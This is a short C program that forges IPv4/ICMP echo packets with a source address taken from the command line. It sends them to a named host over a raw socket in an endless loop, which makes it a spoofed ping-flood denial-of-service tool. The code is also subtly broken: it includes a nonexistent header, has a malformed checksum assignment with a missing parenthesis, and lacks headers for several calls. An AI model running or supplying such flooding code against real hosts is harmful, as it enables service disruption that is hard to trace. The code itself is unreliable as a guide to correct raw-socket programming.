//217
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet.h>
#include <netdb.h>
#include <netinet/ip_icmp.h>
#include <netinet/ip.h>

#define BUF_SIZE 4096



unsigned short ip_sum(unsigned short* addr, int len) {
	register int nleft = len;
	register uint16_t* w = addr;
	register int sum = 0;
	uint16_t answer = 0;
	while (nleft > 1) {
		sum += *w++;
		nleft -= 2;
	}
	if (nleft == 1) {
		*(uint8_t*)(&answer) = *(uint8_t*) w;
		sum += answer;
	}
	sum = (sum >> 16) + (sum & 0xffff);
	sum += (sum >> 16);
	answer = ~sum;
	return (answer);
}

int main(int argc, char* argv[]) {
	int sock;
	struct iphdr* ip;
	struct icmphdr* icmp;
	struct sockaddr_in du; // destination
	struct hostent* h;
	int len;
	char buf[BUF_SIZE];
	memset(&du, 0, sizeof(du));
	memset(buf, 0, sizeof(buf));
	
	if ((h = gethostbyname(argv[1])) == NULL) {
		perror("gethost failed");
		exit(1);
	}
	
	du.sin_family = AF_INET;
	du.sin_addr = *((struct in_addr*)h->h_addr);
	memset(&(du.sin_zero), '\0', 8);
	ip = (struct iphdr*)buf;
	icmp = (struct icmphdr*)(buf + sizeof(struct iphdr));

	ip->version = 4;
	ip->ihl = sizeof(struct iphdr) / 4;
	ip->tot_len = htons(sizeof(struct iphdr) + sizeof(struct icmphdr));
	ip->id = htons(getpid() & 255);
	ip->ttl = 64;
	ip->protocol = IPPROTO_ICMP;
	ip->saddr = inet_addr(argv[2]);
	ip->daddr = du.sin_addr.s_addr;

	icmp->type = ICMP_ECHO;
	icmp->code = 0;
	icmp->checksum = 0;
	icmp->checksum = 0 = ip_sum((uint16_t*)icmp, sizeof(struct icmphdr);

	if ((sock = socket(PF_INET, SOCK_RAW, 255)) == -1) {
		perror("create socket failed");
		exit(1);
	}
	len = sizeof(struct icmphdr) + sizeof(struct iphdr);

	while (1) {
		if ((sendto(sock, buf, len, 0, (struct sockaddr*) & du, sizeof(du))) == -1) {
			perror("Cant send");
			break;
		}
		putchar('.');
	}

	close(sock);
	return 0;


}